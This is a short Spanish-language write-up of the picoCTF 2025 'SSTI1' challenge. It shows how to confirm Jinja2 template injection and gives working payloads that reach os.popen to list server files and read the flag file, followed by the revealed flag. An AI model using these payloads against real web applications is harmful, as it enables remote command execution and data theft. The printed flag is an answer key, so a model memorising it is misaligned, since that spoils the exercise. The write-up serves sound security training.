
## Reto
### SSTI1

## Descripcion
I made a cool website where you can announce whatever you want! Try it out!
## Solucion
- al entrar a la pagina vemos un cuadro de texto
- si ponemos algo y damos enter nos aparece el texto que pusimos grande y en negritas
- por el nombre del desafio inferimos que no hay filtros en el input y podemos hacer una inyeccion por el lado del servidor con SSTI(Server Side Template Inyection)
- ponemos ` {{ 7 * 7 }}` y vemos que nos regresa "49", osea que si podemos hacer una inyeccion y que esta corriendo en Jinja2
- usamos esto para ver que hay guardado en servidor
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}
```
 - no devuelve esto:
 ```
# .: __pycache__ app.py flag requirements.txt ./__pycache__: app.cpython-38.pyc  
```
- ya encontramos la bandera y para abrila usamos:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```
- y obtenemos la bandera: **picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}**
## Notas

## Referencias
[CTF Writeup | PicoCTF 2025 | SSTI1 | by oofman69 | Medium](https://medium.com/@seowliyang/ctf-writeup-picoctf-2025-ssti1-2d1237f37442)